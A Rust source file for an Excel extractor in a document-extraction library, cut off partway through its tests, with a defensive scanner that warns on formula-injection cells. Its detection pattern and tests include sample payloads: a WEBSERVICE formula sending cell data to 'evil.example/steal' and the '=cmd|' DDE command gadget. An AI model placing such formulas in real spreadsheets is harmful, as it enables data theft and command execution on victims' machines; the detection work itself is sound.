//! Excel spreadsheet extractor.

use crate::Result;
use crate::core::config::ExtractionConfig;
use crate::extractors::SyncExtractor;
use crate::extractors::security::SecurityBudget;
use crate::plugins::{InternalDocumentExtractor, Plugin};
use crate::types::internal::InternalDocument;
use crate::types::internal_builder::InternalDocumentBuilder;
use crate::types::page::PageContent;
use crate::types::tables::Table;
use crate::types::{ExcelMetadata, Metadata, ProcessingWarning};
use ahash::AHashMap;
use async_trait::async_trait;
use std::borrow::Cow;
use std::path::Path;
use std::sync::Arc;

/// DDE and external-call formula patterns that should surface as warnings.
///
/// Calamine resolves most formulas to their cached result value, so the raw
/// `=DDE(...)` string rarely appears in `Data::String` cells. However, some
/// tools store the formula string directly (e.g. when no cached value
/// exists), and calamine emits it verbatim. The patterns below catch the
/// known injection-vector forms. Matching is case-insensitive and anchored
/// to the start of the cell value to avoid false positives on plain text.
///
/// Patterns:
/// - `=DDE(` — Dynamic Data Exchange
/// - `=WEBSERVICE(` — HTTP fetch from external URL
/// - `=HYPERLINK(` — clickable URL (not execution, but disclosure risk)
/// - `=cmd|` — classic CSV/OOXML RCE gadget via DDE with cmd shell
static DDE_PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();

fn dde_pattern() -> &'static regex::Regex {
    DDE_PATTERN.get_or_init(|| regex::Regex::new(r"(?i)^=(DDE\(|WEBSERVICE\(|HYPERLINK\(|cmd\|)").unwrap())
}

/// Classify the formula kind from a matching cell value for the warning message.
fn classify_formula(cell: &str) -> &'static str {
    let upper = cell.to_ascii_uppercase();
    if upper.starts_with("=DDE(") {
        "DDE"
    } else if upper.starts_with("=WEBSERVICE(") {
        "WEBSERVICE"
    } else if upper.starts_with("=HYPERLINK(") {
        "HYPERLINK"
    } else {
        "ExternalCall"
    }
}

/// Scan all cells in a workbook for DDE / external-call formula strings.
///
/// Returns one `ProcessingWarning` per matching cell (capped at 100 to avoid
/// flooding the warnings list on adversarial documents). The warning carries
/// the sheet name, zero-based row/col coordinates, and the classified formula
/// kind so downstream consumers can triage.
fn scan_for_dde_warnings(workbook: &crate::types::ExcelWorkbook) -> Vec<ProcessingWarning> {
    const MAX_DDE_WARNINGS: usize = 100;
    let pattern = dde_pattern();
    let mut warnings = Vec::new();

    'outer: for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            for (row_idx, row) in cells.iter().enumerate() {
                for (col_idx, cell) in row.iter().enumerate() {
                    if !cell.is_empty() && pattern.is_match(cell) {
                        let kind = classify_formula(cell);
                        warnings.push(ProcessingWarning {
                            source: Cow::Borrowed("excel_dde_scan"),
                            message: Cow::Owned(format!(
                                "Cell [{sheet}!R{row}C{col}] contains \
                                 a {kind} formula that may reference external resources",
                                sheet = sheet.name,
                                row = row_idx + 1,
                                col = col_idx + 1,
                            )),
                        });
                        if warnings.len() >= MAX_DDE_WARNINGS {
                            break 'outer;
                        }
                    }
                }
            }
        }
    }

    warnings
}

/// Validate an Excel workbook against security limits.
///
/// Iterates sheets and their cells, enforcing `max_table_cells` and
/// `max_content_size` via the provided [`SecurityBudget`].
fn validate_workbook_budget(workbook: &crate::types::ExcelWorkbook, budget: &mut SecurityBudget) -> crate::Result<()> {
    for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            let row_count = cells.len();
            let col_count = cells.iter().map(|r| r.len()).max().unwrap_or(0);
            budget.add_cells(row_count.saturating_mul(col_count))?;
            for row in cells {
                for cell in row {
                    budget.account_text(cell.len())?;
                }
            }
        }
    }
    Ok(())
}

/// MIME types backed by an OOXML (or OOXML-derived binary) ZIP package, i.e.
/// formats that may carry embedded objects under `xl/embeddings/`
/// (xberg-io/xberg#78). `.xls`/`.xla` (legacy binary, not a ZIP) and `.ods`
/// (OpenDocument, different embedding convention) are excluded.
#[cfg(feature = "office")]
fn is_ooxml_zip_mime(mime_type: &str) -> bool {
    matches!(
        mime_type,
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
            | "application/vnd.ms-excel.sheet.macroEnabled.12"
            | "application/vnd.ms-excel.addin.macroEnabled.12"
            | "application/vnd.ms-excel.template.macroEnabled.12"
            | "application/vnd.ms-excel.sheet.binary.macroEnabled.12"
            | "application/vnd.openxmlformats-officedocument.spreadsheetml.template"
    )
}

/// Name the embedded objects under `xl/embeddings/` in an OOXML zip package,
/// for the [`SyncExtractor`] path (WASM), which cannot recurse into them the way
/// `extract_content`/`extract_path` do via `ooxml_embedded` (that helper calls
/// back into the async extraction pipeline). Naming them in a warning at least
/// makes their presence and identity visible (xberg-io/xberg#78) rather than
/// silently dropping them.
///
/// Returns `None` when `mime_type` is not an OOXML zip format, the content is
/// not a readable zip, or the archive has no `xl/embeddings/` entries.
#[cfg(feature = "office")]
fn scan_for_embedded_objects(content: &[u8], mime_type: &str) -> Option<ProcessingWarning> {
    if !is_ooxml_zip_mime(mime_type) {
        return None;
    }

    let cursor = std::io::Cursor::new(content);
    let mut archive = zip::ZipArchive::new(cursor).ok()?;

    let mut names = Vec::new();
    for i in 0..archive.len() {
        let entry = archive.by_index(i).ok()?;
        let name = entry.name().to_string();
        if name.starts_with("xl/embeddings/") && !name.ends_with('/') {
            names.push(name);
        }
    }
    if names.is_empty() {
        return None;
    }
    names.sort();

    Some(ProcessingWarning {
        source: Cow::Borrowed("excel"),
        message: Cow::Owned(format!(
            "Workbook contains {} embedded object{} that were not extracted ({})",
            names.len(),
            if names.len() == 1 { "" } else { "s" },
            crate::core::diagnostics::format_entry_list(&names)
        )),
    })
}

/// Excel spreadsheet extractor using calamine.
///
/// Supports: .xlsx, .xlsm, .xlam, .xltm, .xls, .xla, .xlsb, .ods
#[cfg_attr(alef, alef(skip))]
pub struct ExcelExtractor;

impl Default for ExcelExtractor {
    fn default() -> Self {
        Self::new()
    }
}

impl ExcelExtractor {
    pub(crate) fn new() -> Self {
        Self
    }

    /// Escape markdown-significant characters in a sheet name for use in a heading.
    ///
    /// Prevents adversarial or unusual sheet names from producing double headings (e.g.
    /// `## ## Profit`) or broken inline elements (e.g. `[Sales](evil)` rendered as a
    /// link). Escapes: `#`, `>`, `-`, `*`, `+`, `\`, `` ` ``, `_`, `[`, `]`, `<`, `>`.
    /// Leading whitespace is stripped because it is invisible and can confuse renderers.
    ///
    /// Scope: used only for the per-page heading in XLSX/ODS output; does not affect the
    /// stored `sheet_name` field, which always carries the raw name.
    fn escape_sheet_name_for_heading(name: &str) -> String {
        const INLINE_METACHARS: &[char] = &['\\', '`', '*', '_', '[', ']', '<', '>', '!'];

        let name = name.trim_start();
        let mut out = String::with_capacity(name.len() + 8);

        for (i, ch) in name.char_indices() {
            let needs_escape =
                (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~')) || INLINE_METACHARS.contains(&ch);
            if needs_escape {
                out.push('\\');
            }
            out.push(ch);
        }

        out
    }

    /// Parse the `hidden_sheets` workbook-metadata entry (a comma-separated list of
    /// sheet names populated by `extraction::excel::extract_metadata` from calamine's
    /// `sheets_metadata()`) into the set of sheet names that are hidden or very-hidden
    /// (xberg-io/xberg#119). A sheet's own content carries no visibility flag, so this
    /// is the only way `build_internal_document` can tell a hidden sheet from a visible
    /// one.
    fn hidden_sheet_names(workbook: &crate::types::ExcelWorkbook) -> std::collections::HashSet<&str> {
        workbook
            .metadata
            .get("hidden_sheets")
            .map(|names| names.split(", ").collect())
            .unwrap_or_default()
    }

    /// Build an `InternalDocument` from the workbook.
    ///
    /// Each sheet becomes a table preceded by an H2 heading with the sheet name (when
    /// non-empty). A sheet hidden in the workbook (`hidden_sheets` metadata) has
    /// `" (hidden)"` appended to its heading so hidden content is distinguishable from
    /// visible content (xberg-io/xberg#119). Additionally, `prebuilt_pages` is set to
    /// `Some(Vec<PageContent>)` with one entry per sheet so that `ExtractedDocument.pages`
    /// is always `Some` for Excel.
    ///
    /// Empty sheets still produce a `PageContent` entry so the page index aligns with the
    /// sheet index. The top-level `content` remains the concatenation of all per-sheet
    /// content, preserving backward compat for callers that do not read `pages`.
    fn build_internal_document(workbook: &crate::types::ExcelWorkbook) -> InternalDocument {
        let mut builder = InternalDocumentBuilder::new("excel");
        let mut pages: Vec<PageContent> = Vec::with_capacity(workbook.sheets.len());
        let hidden_sheets = Self::hidden_sheet_names(workbook);

        for (sheet_index, sheet) in workbook.sheets.iter().enumerate() {
            let page_number = (sheet_index + 1) as u32;
            let name_opt: Option<String> = if sheet.name.is_empty() {
                None
            } else {
                Some(sheet.name.clone())
            };
            let is_hidden = hidden_sheets.contains(sheet.name.as_str());
            let hidden_suffix = if is_hidden { " (hidden)" } else { "" };

            if let Some(ref cells) = sheet.table_cells
                && !cells.is_empty()
            {
                if !sheet.name.is_empty() {
                    builder.push_heading(2, &format!("{}{hidden_suffix}", sheet.name), None, None);
                }
                builder.push_table_from_cells(cells, Some(page_number), None);

                let page_content = if sheet.name.is_empty() {
                    sheet.markdown.clone()
                } else {
                    format!(
                        "## {}{hidden_suffix}\n\n{}",
                        Self::escape_sheet_name_for_heading(&sheet.name),
                        sheet.markdown
                    )
                };

                let arc_table = Arc::new(Table {
                    cells: cells.clone(),
                    markdown: sheet.markdown.clone(),
                    page_number,
                    bounding_box: None,
                    ..Default::default()
                });

                pages.push(PageContent {
                    page_number,
                    content: page_content,
                    tables: vec![arc_table],
                    image_indices: Vec::new(),
                    hierarchy: None,
                    is_blank: Some(false),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                });
            } else {
                let content = match name_opt.as_deref() {
                    Some(n) => format!("## {}{hidden_suffix}\n\n", Self::escape_sheet_name_for_heading(n)),
                    None => String::new(),
                };

                pages.push(PageContent {
                    page_number,
                    content,
                    tables: Vec::new(),
                    image_indices: Vec::new(),
                    hierarchy: None,
                    is_blank: Some(true),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                });
            }
        }

        let mut doc = builder.build();
        doc.prebuilt_pages = Some(pages);
        doc
    }
}

impl Plugin for ExcelExtractor {
    fn name(&self) -> &str {
        "excel-extractor"
    }

    fn version(&self) -> String {
        env!("CARGO_PKG_VERSION").to_string()
    }

    fn initialize(&self) -> Result<()> {
        Ok(())
    }

    fn shutdown(&self) -> Result<()> {
        Ok(())
    }
}

impl ExcelExtractor {
    /// Build an InternalDocument from a workbook with metadata.
    fn workbook_to_internal_document(workbook: &crate::types::ExcelWorkbook) -> InternalDocument {
        let mut doc = Self::build_internal_document(workbook);

        let sheet_names: Vec<String> = workbook.sheets.iter().map(|s| s.name.clone()).collect();
        let sheet_count = workbook.sheets.len() as u32;
        let excel_metadata = ExcelMetadata {
            sheet_count: Some(sheet_count),
            sheet_names: Some(sheet_names),
        };

        let mut additional = AHashMap::new();
        let wb_meta = &workbook.metadata;

        let title = wb_meta.get("title").cloned();
        let subject = wb_meta.get("subject").cloned();
        let created_by = wb_meta.get("created_by").or_else(|| wb_meta.get("creator")).cloned();
        let modified_by = wb_meta.get("modified_by").cloned();
        let created_at = wb_meta.get("created_at").cloned();
        let modified_at = wb_meta.get("modified_at").cloned();
        let authors = created_by.as_ref().map(|a| vec![a.clone()]);
        let keywords = wb_meta.get("keywords").map(|k| {
            k.split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        });
        let language = wb_meta.get("language").cloned();

        for (key, value) in &workbook.metadata {
            match key.as_str() {
                "title" | "subject" | "created_by" | "creator" | "modified_by" | "created_at" | "modified_at"
                | "keywords" | "language" => {}
                _ => {
                    additional.insert(Cow::Owned(key.clone()), serde_json::json!(value));
                }
            }
        }

        doc.metadata = Metadata {
            title,
            subject,
            authors,
            keywords,
            language,
            created_at,
            modified_at,
            created_by,
            modified_by,
            format: Some(crate::types::FormatMetadata::Excel(excel_metadata)),
            additional,
            ..Default::default()
        };

        doc.revisions = workbook.revisions.clone();

        for warning in scan_for_dde_warnings(workbook) {
            doc.processing_warnings.push(warning);
        }

        doc
    }
}

impl SyncExtractor for ExcelExtractor {
    fn extract_sync(&self, content: &[u8], mime_type: &str, config: &ExtractionConfig) -> Result<InternalDocument> {
        let _span = tracing::debug_span!("extract_excel", element_count = tracing::field::Empty,).entered();

        let extension = match mime_type {
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" => ".xlsx",
            "application/vnd.ms-excel.sheet.macroEnabled.12" => ".xlsm",
            "application/vnd.ms-excel.addin.macroEnabled.12" => ".xlam",
            "application/vnd.ms-excel.template.macroEnabled.12" => ".xltm",
            "application/vnd.ms-excel" => ".xls",
            "application/vnd.ms-excel.addin.macroEnabled" => ".xla",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12" => ".xlsb",
            "application/vnd.oasis.opendocument.spreadsheet" => ".ods",
            _ => ".xlsx",
        };

        let (workbook, read_warnings) = crate::extraction::excel::read_excel_bytes(content, extension)?;
        let mut budget = SecurityBudget::from_config(config);
        validate_workbook_budget(&workbook, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.processing_warnings.extend(read_warnings);
        doc.mime_type = mime_type.to_string();

        // The sync path (WASM) cannot recurse into embedded objects the way
        // `extract_content`/`extract_path` do via `ooxml_embedded`, which requires
        // async pipeline extraction. Name them in a warning instead so a workbook
        // with embedded files doesn't look fully extracted (xberg-io/xberg#78).
        #[cfg(feature = "office")]
        if config.max_archive_depth > 0
            && let Some(warning) = scan_for_embedded_objects(content, mime_type)
        {
            doc.processing_warnings.push(warning);
        }

        Ok(doc)
    }
}

#[cfg_attr(not(target_arch = "wasm32"), async_trait)]
#[cfg_attr(target_arch = "wasm32", async_trait(?Send))]
impl InternalDocumentExtractor for ExcelExtractor {
    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, content, config),
        fields(
            extractor.name = self.name(),
            content.size_bytes = content.len(),
        )
    ))]
    async fn extract_content(
        &self,
        content: &[u8],
        mime_type: &str,
        config: &ExtractionConfig,
    ) -> Result<InternalDocument> {
        let extension = match mime_type {
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" => ".xlsx",
            "application/vnd.ms-excel.sheet.macroEnabled.12" => ".xlsm",
            "application/vnd.ms-excel.addin.macroEnabled.12" => ".xlam",
            "application/vnd.ms-excel.template.macroEnabled.12" => ".xltm",
            "application/vnd.ms-excel" => ".xls",
            "application/vnd.ms-excel.addin.macroEnabled" => ".xla",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12" => ".xlsb",
            "application/vnd.oasis.opendocument.spreadsheet" => ".ods",
            _ => ".xlsx",
        };

        let (workbook, read_warnings) = {
            #[cfg(feature = "tokio-runtime")]
            {
                if crate::core::batch_mode::is_batch_mode() {
                    if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                        return Err(crate::error::XbergError::Cancelled);
                    }
                    let content_owned = content.to_vec();
                    let extension_owned = extension.to_string();
                    let span = tracing::Span::current();
                    tokio::task::spawn_blocking(move || {
                        let _guard = span.entered();
                        crate::extraction::excel::read_excel_bytes(&content_owned, &extension_owned)
                    })
                    .await
                    .map_err(|e| crate::error::XbergError::parsing(format!("Excel extraction task failed: {}", e)))??
                } else {
                    crate::extraction::excel::read_excel_bytes(content, extension)?
                }
            }
            #[cfg(not(feature = "tokio-runtime"))]
            {
                if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                    return Err(crate::error::XbergError::Cancelled);
                }
                crate::extraction::excel::read_excel_bytes(content, extension)?
            }
        };

        let mut budget = SecurityBudget::from_config(config);
        validate_workbook_budget(&workbook, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.processing_warnings.extend(read_warnings);
        doc.mime_type = mime_type.to_string();

        #[cfg(feature = "office")]
        if config.max_archive_depth > 0 && is_ooxml_zip_mime(mime_type) {
            let (children, embed_warnings) = crate::extraction::ooxml_embedded::extract_ooxml_embedded_objects(
                content,
                "xl/embeddings/",
                "excel",
                config,
            )
            .await;
            if !children.is_empty() {
                doc.children = Some(children);
            }
            doc.processing_warnings.extend(embed_warnings);
        }

        Ok(doc)
    }

    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, path, config),
        fields(
            extractor.name = self.name(),
        )
    ))]
    async fn extract_path(&self, path: &Path, mime_type: &str, config: &ExtractionConfig) -> Result<InternalDocument> {
        let path_str = path
            .to_str()
            .ok_or_else(|| crate::XbergError::validation("Invalid file path".to_string()))?;

        let (workbook, read_warnings) = crate::extraction::excel::read_excel_file(path_str)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.processing_warnings.extend(read_warnings);
        doc.mime_type = mime_type.to_string();

        #[cfg(not(feature = "office"))]
        let _ = config;

        #[cfg(feature = "office")]
        if config.max_archive_depth > 0 && is_ooxml_zip_mime(mime_type) {
            let file_bytes = crate::core::io::open_file_bytes(path)?;
            let (children, embed_warnings) = crate::extraction::ooxml_embedded::extract_ooxml_embedded_objects(
                &file_bytes,
                "xl/embeddings/",
                "excel",
                config,
            )
            .await;
            if !children.is_empty() {
                doc.children = Some(children);
            }
            doc.processing_warnings.extend(embed_warnings);
        }

        Ok(doc)
    }

    fn supported_mime_types(&self) -> &[&str] {
        &[
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-excel.sheet.macroEnabled.12",
            "application/vnd.ms-excel.addin.macroEnabled.12",
            "application/vnd.ms-excel.template.macroEnabled.12",
            "application/vnd.ms-excel",
            "application/vnd.ms-excel.addin.macroEnabled",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template",
        ]
    }

    fn priority(&self) -> i32 {
        50
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{ExcelSheet, ExcelWorkbook};
    use std::collections::HashMap;

    fn make_sheet(name: &str, cells: Option<Vec<Vec<String>>>) -> ExcelSheet {
        let (markdown, row_count, col_count, cell_count) = match cells.as_ref() {
            Some(c) if !c.is_empty() => {
                let rows = c.len();
                let cols = c.iter().map(|r| r.len()).max().unwrap_or(0);
                let count = c.iter().flat_map(|r| r.iter()).filter(|s| !s.is_empty()).count();
                let mut md = String::new();
                for (i, row) in c.iter().enumerate() {
                    md.push('|');
                    for cell in row {
                        md.push(' ');
                        md.push_str(cell);
                        md.push_str(" |");
                    }
                    md.push('\n');
                    if i == 0 && c.len() > 1 {
                        md.push('|');
                        for _ in row {
                            md.push_str(" --- |");
                        }
                        md.push('\n');
                    }
                }
                (md, rows, cols, count)
            }
            _ => (String::new(), 0, 0, 0),
        };
        ExcelSheet {
            name: name.to_string(),
            markdown,
            row_count,
            col_count,
            cell_count,
            table_cells: cells,
        }
    }

    fn make_workbook(sheets: Vec<ExcelSheet>) -> ExcelWorkbook {
        ExcelWorkbook {
            sheets,
            metadata: HashMap::new(),
            revisions: None,
        }
    }

    #[test]
    fn test_excel_extractor_plugin_interface() {
        let extractor = ExcelExtractor::new();
        assert_eq!(extractor.name(), "excel-extractor");
        assert!(extractor.initialize().is_ok());
        assert!(extractor.shutdown().is_ok());
    }

    #[test]
    fn test_excel_extractor_supported_mime_types() {
        let extractor = ExcelExtractor::new();
        let mime_types = extractor.supported_mime_types();
        assert_eq!(mime_types.len(), 9);
        assert!(mime_types.contains(&"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"));
        assert!(mime_types.contains(&"application/vnd.ms-excel"));
    }

    #[test]
    fn test_prebuilt_pages_always_some() {
        let workbook = make_workbook(vec![]);
        let doc = ExcelExtractor::build_internal_document(&workbook);
        assert!(doc.prebuilt_pages.is_some());
        assert_eq!(doc.prebuilt_pages.unwrap().len(), 0);
    }

    #[test]
    fn test_single_sheet_produces_one_page() {
        let cells = vec![
            vec!["Name".to_string(), "Value".to_string()],
            vec!["A".to_string(), "1".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Sheet1", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Sheet1"));
        assert_eq!(pages[0].section_name, None);
        assert!(pages[0].content.contains("Sheet1"));
        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[0].is_blank, Some(false));
    }

    #[test]
    fn test_single_sheet_content_matches_flat_content() {
        let cells = vec![
            vec!["Col1".to_string(), "Col2".to_string()],
            vec!["r1".to_string(), "r2".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Data", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        assert!(pages[0].content.starts_with("## Data"));
        assert!(pages[0].content.contains("Col1"));
        assert!(pages[0].content.contains("r1"));
    }

    #[test]
    fn test_multi_sheet_workbook_produces_one_page_per_sheet() {
        let sheet1_cells = vec![
            vec!["A".to_string(), "B".to_string()],
            vec!["1".to_string(), "2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string(), "Q".to_string(), "R".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Second", Some(sheet2_cells)),
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 3);

        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        assert_eq!(pages[0].sheet_name.as_deref(), Some("First"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Second"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("Third"));
        assert_eq!(pages[0].section_name, None);
        assert_eq!(pages[1].section_name, None);
        assert_eq!(pages[2].section_name, None);

        assert!(pages[0].content.contains("First"));
        assert!(!pages[0].content.contains("Second"));
        assert!(pages[1].content.contains("Second"));
        assert!(!pages[1].content.contains("First"));
        assert!(pages[2].content.contains("Third"));

        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[1].tables.len(), 1);
        assert_eq!(pages[2].tables.len(), 1);

        assert_eq!(pages[0].tables[0].cells[0][0], "A");
        assert_eq!(pages[1].tables[0].cells[0][0], "X");
        assert_eq!(pages[2].tables[0].cells[0][0], "P");
    }

    #[test]
    fn test_top_level_tables_populated_for_multi_sheet_workbook() {
        let sheet1_cells = vec![
            vec!["H1".to_string(), "H2".to_string()],
            vec!["r1c1".to_string(), "r1c2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("Alpha", Some(sheet1_cells)),
            make_sheet("Beta", Some(sheet2_cells)),
            make_sheet("Gamma", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        assert_eq!(
            doc.tables.len(),
            3,
            "top-level tables count must equal number of sheets with data"
        );

        assert_eq!(doc.tables[0].page_number, 1);
        assert_eq!(doc.tables[1].page_number, 2);
        assert_eq!(doc.tables[2].page_number, 3);

        assert_eq!(doc.tables[0].cells[0][0], "H1");
        assert_eq!(doc.tables[1].cells[0][0], "X");
        assert_eq!(doc.tables[2].cells[0][0], "P");
    }

    #[test]
    fn test_empty_sheet_in_middle_produces_page_at_correct_index() {
        let sheet1_cells = vec![vec!["A".to_string()]];
        let sheet3_cells = vec![vec!["C".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Empty", None),
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 3);

        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Empty"));
        assert_eq!(pages[1].section_name, None);
        assert!(
            pages[1].content.ends_with("\n\n"),
            "empty-sheet content must end with two newlines, got: {:?}",
            pages[1].content
        );

        assert_eq!(pages[0].is_blank, Some(false));
        assert_eq!(pages[2].is_blank, Some(false));
    }

    #[test]
    fn test_empty_sheet_cells_vec_produces_page_at_correct_index() {
        let workbook = make_workbook(vec![
            make_sheet("HasData", Some(vec![vec!["x".to_string()]])),
            make_sheet("EmptyCells", Some(vec![])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 2);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        assert!(pages[1].content.ends_with("\n\n"), "empty sheet must end with \\n\\n");
    }

    #[test]
    fn test_sheet_order_preserved() {
        let workbook = make_workbook(vec![
            make_sheet("Z", Some(vec![vec!["z".to_string()]])),
            make_sheet("A", Some(vec![vec!["a".to_string()]])),
            make_sheet("M", Some(vec![vec!["m".to_string()]])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Z"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("A"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("M"));
    }

    fn make_dde_workbook(cell_value: &str) -> ExcelWorkbook {
        make_workbook(vec![make_sheet("Sheet1", Some(vec![vec![cell_value.to_string()]]))])
    }

    #[test]
    fn test_dde_formula_emits_warning() {
        let workbook = make_dde_workbook("=DDE(\"winword\",\"c:\\test.doc\",\"All\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1, "exactly one DDE warning expected");
        assert!(
            warnings[0].message.contains("DDE"),
            "warning must name the formula kind: {}",
            warnings[0].message
        );
        assert!(
            warnings[0].message.contains("R1C1"),
            "warning must include cell coordinate: {}",
            warnings[0].message
        );
        assert_eq!(warnings[0].source, "excel_dde_scan");
    }

    #[test]
    fn test_webservice_formula_emits_warning() {
        let workbook = make_dde_workbook("=WEBSERVICE(\"https://evil.example/steal?data=\"&A1)");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("WEBSERVICE"), "{}", warnings[0].message);
    }

    #[test]
    fn test_hyperlink_formula_emits_warning() {
        let workbook = make_dde_workbook("=HYPERLINK(\"https://evil.example\",\"click me\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("HYPERLINK"), "{}", warnings[0].message);
    }

    #[test]
    fn test_cmd_pipe_formula_emits_warning() {
        let workbook = make_dde_workbook("=cmd|' /c calc'!A0");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("ExternalCall"), "{}", warnings[0].message);
    }

    #[test]
    fn test_benign_formula_string_no_warning() {
        for safe in &["=SUM(A1:A2)", "=AVERAGE(B:B)", "hello world", "42", ""] {
            let workbook = make_dde_workbook(safe);
            let warnings = scan_for_dde_warnings(&workbook);
            assert!(
                warnings.is_empty(),
                "unexpected DDE warning for safe cell {:?}: {:?}",
                safe,
                warnings
            );
        }
    }

    #[test]
    fn test_dde_warning_cap_at_100() {
        let cells: Vec<Vec<String>> = (0..200)
            .map(|i| vec![format!("=DDE(\"app\",\"topic\",\"item{}\")", i)])
            .collect();
        let workbook = make_workbook(vec![make_sheet("Big", Some(cells))]);
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(
            warnings.len(),
            100,
            "DDE warnings must be capped at 100, got {}",
            warnings.len()
        );
    }

    #[test]
    fn test_dde_formula_case_insensitive() {
        for variant in &[
            "=dde(\"app\",\"t\",\"i\")",
            "=DdE(\"a\",\"b\",\"c\")",
            "=webservice(\"x\")",
        ] {
            let workbook = make_dde_workbook(variant);
            let warnings = scan_for_dde_warnings(&workbook);
            assert_eq!(warnings.len(), 1, "case-insensitive match failed for {:?}", variant);
        }
    }

    #[test]
    fn test_workbook_to_internal_document_includes_dde_warnings() {
        let workbook = make_workbook(vec![make_sheet(
            "Injection",
            Some(vec![
                vec!["=DDE(\"app\",\"topic\",\"data\")".to_string()],
                vec!["normal".to_string()],
            ]),
        )]);
        let doc = ExcelExtractor::workbook_to_internal_document(&workbook);
        let dde_warnings: Vec<_> = doc
            .processing_warnings
            .iter()
            .filter(|w| w.source == "excel_dde_scan")
            .collect();
        assert_eq!(dde_warnings.len(), 1, "one DDE warning expected in InternalDocument");
        assert!(dde_warnings[0].message.contains("DDE"), "{}", dde_warnings[0].message);
    }

    #[test]
    fn test_sheet_name_markdown_escape_in_heading() {
        let cells = vec![
            vec!["Revenue".to_string(), "Cost".to_string()],
            vec!["100".to_string(), "80".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("## Profit (2025) [Q1]", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);

        assert_eq!(pages[0].sheet_name.as_deref(), Some("## Profit (2025) [Q1]"));

        assert!(
            !pages[0].content.starts_with("## ##"),
            "double heading detected: {:?}",
            &pages[0].content[..pages[0].content.find('\n').unwrap_or(pages[0].content.len())]
        );
        let first_line = pages[0].content.lines().next().unwrap_or("");
        assert!(
